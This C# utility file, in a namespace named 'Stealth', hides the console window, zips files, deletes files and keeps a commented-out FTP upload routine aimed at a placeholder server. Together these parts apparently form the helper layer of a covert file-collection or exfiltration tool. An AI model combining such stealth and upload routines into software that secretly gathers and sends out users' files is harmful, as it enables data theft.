using System;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Runtime.InteropServices;

namespace Stealth
{
    class Util
    {
        public static void hide()
        {
            ShowWindow(GetConsoleWindow(), 0);
        }

        //just wanted to leave it here even though it is unused
        ///// <summary>
        ///// Uploads the given file to the given server using the given username and password.
        ///// </summary>
        ///// <param name="serverandfile">ftp://foo.bar/file</param>
        ///// <param name="file">C:\file</param>
        ///// <param name="user">The username</param>
        ///// <param name="pass">The password</param>
        //public static void ftp_transfer(string serverandfile, string file, string user, string pass)
        //{
        //    FtpWebRequest request = (FtpWebRequest)WebRequest.Create(serverandfile);
        //    request.Method = WebRequestMethods.Ftp.UploadFile;
        //    request.Credentials = new NetworkCredential(user, pass);
        //    request.ContentLength = new FileInfo(file).Length;
        //    Stream s = File.Open(file, FileMode.Open, FileAccess.Read);
        //    Stream t = request.GetRequestStream();
        //    s.CopyTo(t, 1024 * 1024);
        //    s.Close();
        //    t.Close();
        //    request.GetResponse();
        //}

        public static ZipArchive create_zip(string file)
        {
            return ZipFile.Open(file, ZipArchiveMode.Create);
        }

        public static void delete(string file)
        {
            File.Delete(file);
        }

        /// <summary>
        /// Basically ZipFile.CreateEntryFromFile.
        /// </summary>
        public static void add_entry(ZipArchive zip, string name, string file)
        {
            Stream s = zip.CreateEntry(name, CompressionLevel.Optimal).Open();
            Stream t = File.Open(file, FileMode.Open, FileAccess.Read);
            t.CopyTo(s, 1024 * 1024);
            s.Close();
            t.Close();
        }

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
    }
}
